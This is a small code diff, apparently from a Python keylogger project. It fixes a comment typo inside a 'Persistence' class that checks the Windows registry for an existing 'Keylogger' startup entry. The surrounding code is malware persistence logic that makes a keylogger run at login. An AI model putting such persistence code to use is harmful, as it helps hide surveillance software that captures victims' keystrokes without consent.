@@ -49,7 +49,7 @@ class Persistence: #This will add the program (when turned into an exe) to the r
             index = 0
             while True:
                 v = winreg.EnumValue(key, index)
-                if 'Keylogger' not in v: # And this to waht you have changed above
+                if 'Keylogger' not in v: # And this to what you have changed above
                     index += 1
                     continue
                 return True
